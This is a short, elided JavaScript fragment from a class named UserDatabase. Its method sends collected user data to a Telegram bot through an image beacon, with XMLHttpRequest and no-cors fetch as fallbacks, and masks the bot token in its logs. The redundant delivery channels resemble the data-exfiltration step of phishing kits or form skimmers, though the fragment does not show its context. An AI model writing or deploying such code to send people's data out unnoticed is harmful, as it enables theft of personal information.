...
class UserDatabase {
    ...
    sendToTelegramOnce(userData) {
        ...
        console.log('📤 URL:', url.replace(token, '***TOKEN***')); // Hide token in logs

        // Method 1: Image loading (most reliable for browsers)
        const img = new Image();
        img.onload = () => {
            console.log('✅ Data successfully sent to Telegram (Image method)');
        };
        img.onerror = () => {
            console.log('❌ Image method failed, trying XMLHttpRequest...');
            // Method 2: XMLHttpRequest as backup
            this.sendViaXMLHttpRequest(url);
        };
        img.src = url;

        // Method 3: Also try fetch as additional backup
        setTimeout(() => {
            fetch(url, {
                method: 'GET',
                mode: 'no-cors'
    ...
    // Backup method using XMLHttpRequest
    sendViaXMLHttpRequest(url) {
        try {
